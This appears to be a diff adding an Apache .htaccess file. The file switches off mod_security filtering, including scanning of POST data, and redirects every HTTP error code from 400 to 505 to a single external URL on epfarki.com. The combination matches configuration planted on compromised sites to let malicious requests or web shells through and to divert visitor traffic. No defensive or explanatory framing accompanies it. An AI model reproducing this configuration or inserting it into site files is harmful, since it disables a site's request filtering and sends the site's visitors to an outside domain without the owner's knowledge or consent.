@@ -1,0 +1,27 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+
+# Error Pages
+ErrorDocument 400 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 401 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 402 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 403 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 404 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 405 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 406 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 407 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 408 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 409 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 410 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 411 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 412 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 413 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 414 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 500 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 501 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 502 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 503 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 504 http://epfarki.com/hizmet/sitebilgi
+ErrorDocument 505 http://epfarki.com/hizmet/sitebilgi 
